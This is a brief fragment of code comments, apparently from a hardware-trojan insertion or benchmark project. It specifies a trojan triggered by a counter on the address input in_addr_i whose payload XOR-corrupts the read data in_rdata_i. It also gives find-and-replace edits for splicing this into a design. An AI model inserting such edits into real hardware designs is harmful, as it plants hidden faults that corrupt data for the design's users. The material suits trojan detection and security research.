 ...
 *   
 * Trigger: Counter on in_addr_i
 * Payload: Corrupt in_rdata_i with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt in_rdata_i with XOR
//
// Integration Script Must Modify:
//
// IF in_rdata_i is assigned:
//   Find: assign in_rdata_i = data_value;
//   Replace: assign in_rdata_i = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF in_rdata_i is in always_ff:
//   Find: in_rdata_i <= data_value;
//   Replace: in_rdata_i <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
